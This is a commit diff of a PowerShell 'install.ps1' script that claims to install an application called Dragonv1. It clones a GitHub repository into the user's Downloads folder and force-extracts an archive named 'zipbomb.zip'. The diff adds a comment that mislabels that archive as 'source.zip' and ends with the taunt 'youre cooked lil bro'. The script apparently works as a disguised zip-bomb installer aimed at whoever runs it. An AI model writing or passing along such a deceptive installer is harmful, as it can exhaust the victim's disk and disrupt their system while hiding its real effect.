45d47dfc9761a1f6165198b4fe1eb9a628ff9afc
𝐃𝐫𝐚𝐠𝐨𝐧 <sparshimon@gmail.com>
2026-09-05 16:54:31 +0530

    Fix typos and update installation messages in script

--- install.ps1
+++ install.ps1
@@ -1,10 +1,15 @@
-Write-Host "Installing Dragonv1... by DRAGON a application thats cool as hell"
+Write-Host "Installing Dragonv1... by DRAGON, an application that's cool as hell"
 
+# Go to Downloads
+Set-Location "$HOME\Downloads"
+
+# Clone the repository into Downloads
 git clone https://github.com/12hrformat/dragonv1
 
-Set-Location dragonv1
+# Enter the cloned folder
+Set-Location ".\dragonv1"
 
-# Extract game.zip into the current directory
-Expand-Archive -Path zipbomb.zip -DestinationPath . -Force
+# Extract source.zip into the current directory
+Expand-Archive -Path ".\zipbomb.zip" -DestinationPath "." -Force
 
-Write-Host "Done!"
+Write-Host "Done! youre cooked lil bro"
